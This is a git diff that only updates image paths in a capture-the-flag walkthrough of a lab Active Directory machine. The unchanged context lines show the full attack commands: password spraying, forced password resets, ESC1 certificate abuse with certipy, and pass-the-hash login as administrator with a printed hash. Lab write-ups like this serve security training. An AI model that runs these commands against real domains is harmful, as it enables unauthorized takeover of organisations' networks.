@@ -2,7 +2,7 @@
 
 ## Welcome
 
-![image.png](<../.gitbook/assets/image (7).png>)
+![image.png](<../../.gitbook/assets/image (7).png>)
 
 ## Objective / Scope
 
@@ -161,7 +161,7 @@ PORT      STATE SERVICE       REASON          VERSION
 
     ```
 
-![image.png](<../.gitbook/assets/image 1 (6).png>)
+![image.png](<../../.gitbook/assets/image 1 (6).png>)
 
 * There is an interesting share `Human Resources` with `Read` permissions and we need to see whats inside.
 * Before we dive into the share, usually as a best practice when `IPC$` has also read permissions, always perform a `RID brute force` to enumerate additional users.
@@ -185,7 +185,7 @@ SMB                      10.1.205.139    445    DC01             1114: WELCOME\s
 
 ```
 
-![image.png](<../.gitbook/assets/image 2 (6).png>)
+![image.png](<../../.gitbook/assets/image 2 (6).png>)
 
 * We are able to obtain some users and we them to `users.txt`.
 *   We can also use `awk [options] 'pattern {action}' input-file > output-file` to filter only names.
@@ -195,7 +195,7 @@ SMB                      10.1.205.139    445    DC01             1114: WELCOME\s
 
     ```
 
-![image.png](<../.gitbook/assets/image 3 (6).png>)
+![image.png](<../../.gitbook/assets/image 3 (6).png>)
 
 *   Now that there is a user list and a password, let's try a `password spray for password reuse`
 
@@ -203,18 +203,18 @@ SMB                      10.1.205.139    445    DC01             1114: WELCOME\s
     nxc smb  10.1.205.139 -u users.txt -p 'Il0vemyj0b2025!' --continue-on-success
     ```
 
-![image.png](<../.gitbook/assets/image 4 (6).png>)
+![image.png](<../../.gitbook/assets/image 4 (6).png>)
 
 * No luck here. Only the `e.hills` user uses that password.
 
 #### Enumerating the `Human Resource share`
 
-![image.png](<../.gitbook/assets/image 5 (6).png>)
+![image.png](<../../.gitbook/assets/image 5 (6).png>)
 
 * We used smbclient to connect to the share and there are some interesting documents that we need to look into.
 *   We get download all of them by `mget *`
 
-    ![image.png](<../.gitbook/assets/image 6 (5).png>)
+    ![image.png](<../../.gitbook/assets/image 6 (5).png>)
 * Using `firefox Welcome*` to read the files
 * We retrieved `hr@welcome.local`
 
@@ -222,7 +222,7 @@ There is a document is password protected and we need to find a way to view the 
 
 #### Enumerating the password protected pdf
 
-![image.png](<../.gitbook/assets/image 7 (6).png>)
+![image.png](<../../.gitbook/assets/image 7 (6).png>)
 
 #### Cracking password-protected document - `Welcome Start Guide`
 
@@ -243,16 +243,16 @@ RedBlue@Frank Welcome %
 
 ```
 
-![image.png](<../.gitbook/assets/image 8 (5).png>)
+![image.png](<../../.gitbook/assets/image 8 (5).png>)
 
 * We have managed to crack the hash and the password is `humanresources` and this could be potentially the password for the `hr@welcome.local` that we found early on.
 * We obtained the below interesting findings
 
-![image.png](<../.gitbook/assets/image 9 (6).png>)
+![image.png](<../../.gitbook/assets/image 9 (6).png>)
 
-![image.png](<../.gitbook/assets/image 10 (6).png>)
+![image.png](<../../.gitbook/assets/image 10 (6).png>)
 
-![image.png](<../.gitbook/assets/image 11 (6).png>)
+![image.png](<../../.gitbook/assets/image 11 (6).png>)
 
 Findings
 
@@ -263,7 +263,7 @@ Findings
 nxc smb  10.1.205.139 -u users.txt -p 'Welcome2025!@' --continue-on-success
 ```
 
-![image.png](<../.gitbook/assets/image 12 (6).png>)
+![image.png](<../../.gitbook/assets/image 12 (6).png>)
 
 * User `a.harris` uses the password `Welcome2025!@`
 
@@ -275,26 +275,26 @@ We can use bloodhound for a user friendly view and enumeration and we have too c
 nxc ldap DC01.WELCOME.local -u 'a.harris' -p 'Welcome2025!@' --bloodhound --collection All --dns-server 10.1.205.139
 ```
 
-![image.png](<../.gitbook/assets/image 13 (6).png>)
+![image.png](<../../.gitbook/assets/image 13 (6).png>)
 
 #### Bloodhound Enum and Recon
 
-![image.png](<../.gitbook/assets/image 14 (6).png>)
+![image.png](<../../.gitbook/assets/image 14 (6).png>)
 
 * User `e.hills` has no interesting groups
 * Lets look at another compromised user `a.harris`
 
-![image.png](<../.gitbook/assets/image 15 (4).png>)
+![image.png](<../../.gitbook/assets/image 15 (4).png>)
 
 * a.harris is a memmber of `Remote management users & Hr`
 
-![image.png](<../.gitbook/assets/image 16 (4).png>)
+![image.png](<../../.gitbook/assets/image 16 (4).png>)
 
 * Another interesting thing is that, a.harris is a member of `Hr` which has `GenericAll` Over a `I.Park`
 
-![image.png](<../.gitbook/assets/image 17 (5).png>)
+![image.png](<../../.gitbook/assets/image 17 (5).png>)
 
-![image.png](<../.gitbook/assets/image 18 (3).png>)
+![image.png](<../../.gitbook/assets/image 18 (3).png>)
 
 * `i.park` is a member of some interesting groups, `IT & Helpdesk`
 * `Helpdesk` can `ForceChangePassword` over `SVC_CA & SVC_WEB`
@@ -328,7 +328,7 @@ RedBlue@Frank Welcome %
 
 ```
 
-![image.png](<../.gitbook/assets/image 19 (5).png>)
+![image.png](<../../.gitbook/assets/image 19 (5).png>)
 
 ### Compromising SVC-CA
 
@@ -336,9 +336,9 @@ RedBlue@Frank Welcome %
 * We need to change a password of the `SVC_CA` account and then check if its certificates are vulnerable.
 * **ADMINISTRATORS@WELCOME.LOCAL has `GenericAll` over helpdesk**
 
-![image.png](<../.gitbook/assets/image 18 (3).png>)
+![image.png](<../../.gitbook/assets/image 18 (3).png>)
 
-![image.png](<../.gitbook/assets/image 21 (5).png>)
+![image.png](<../../.gitbook/assets/image 21 (5).png>)
 
 ```bash
 net rpc password 'SVC_CA' 'RedBlue!@7' -U 'Welcome.local'/'i.park'%'RedBlue!@7' -S 10.1.205.139
@@ -351,9 +351,9 @@ certipy-ad find -u 'SVC_CA@Welcome.local' -p 'RedBlue!@7' -dc-ip 10.1.205.139
 
 ```
 
-![image.png](<../.gitbook/assets/image 22 (5).png>)
+![image.png](<../../.gitbook/assets/image 22 (5).png>)
 
-![image.png](<../.gitbook/assets/image 23 (5).png>)
+![image.png](<../../.gitbook/assets/image 23 (5).png>)
 
 * svc\_ca is vulnerable to `ESC1: Enrollee-Supplied Subject for Client Authentication`
 
@@ -385,9 +385,9 @@ certipy account -u 'SVC_CA' -p 'RedBlue!@7' -dc-ip '10.1.205.139' -user 'adminis
 
 ```
 
-![image.png](<../.gitbook/assets/image 24 (5).png>)
+![image.png](<../../.gitbook/assets/image 24 (5).png>)
 
-![image.png](<../.gitbook/assets/image 25 (5).png>)
+![image.png](<../../.gitbook/assets/image 25 (5).png>)
 
 * The output confirms that a certificate was issued
 * The attacker now uses the generated `administrator.pfx` file with certipy auth to authenticate to the domain as the Administrator. This typically involves Kerberos PKINIT.
@@ -396,7 +396,7 @@ certipy account -u 'SVC_CA' -p 'RedBlue!@7' -dc-ip '10.1.205.139' -user 'adminis
 certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.1.205.139'
 ```
 
-![image.png](<../.gitbook/assets/image 26 (5).png>)
+![image.png](<../../.gitbook/assets/image 26 (5).png>)
 
 * Successful authentication results in a Kerberos TGT for the administrator account (saved to administrator.ccache), and Certipy will also attempt to retrieve the NTLM hash of the account. The attacker now possesses the means to act as administrator within the domain.
 *   We can attempt to authenticate with `pass the hash`
@@ -405,7 +405,7 @@ certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.1.205.139'
     evil-winrm -i 10.1.205.139 -u administrator -H :0cf1b799460a39c852068b7c0574677a 
     ```
 
-![image.png](<../.gitbook/assets/image 27 (4).png>)
+![image.png](<../../.gitbook/assets/image 27 (4).png>)
 
 * We are now an administrator
 
@@ -419,8 +419,8 @@ gci C:\ -Include 'root.txt' -File -Recurse -ErrorAction SilentlyContinue | % { "
 
 User- flag
 
-![image.png](<../.gitbook/assets/image 28 (4).png>)
+![image.png](<../../.gitbook/assets/image 28 (4).png>)
 
 Root - Flag
 
-![image.png](<../.gitbook/assets/image 29 (4).png>)
+![image.png](<../../.gitbook/assets/image 29 (4).png>)
